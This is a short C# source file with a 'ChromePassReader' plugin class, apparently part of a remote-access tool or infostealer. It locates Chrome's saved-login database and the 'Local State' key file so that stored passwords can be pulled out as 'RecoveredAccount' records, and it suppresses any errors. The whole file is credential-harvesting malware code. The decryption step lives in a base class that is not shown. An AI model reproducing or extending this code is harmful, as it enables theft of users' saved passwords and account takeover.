

using InvokedCommon.Models;
using System;
using System.Collections.Generic;
using System.IO;


namespace Plugin.Helper.Browsers
{
	public class ChromePassReader : ChromiumBase
	{
		public override string ApplicationName => "Chrome";

		public override IEnumerable<RecoveredAccount> ReadAccounts()
		{
			try
			{
				return (IEnumerable<RecoveredAccount>) this.ReadAccounts(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Login Data"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Local State"));
			}
			catch (Exception ex)
			{
				return (IEnumerable<RecoveredAccount>) new List<RecoveredAccount>();
			}
		}
	}
}
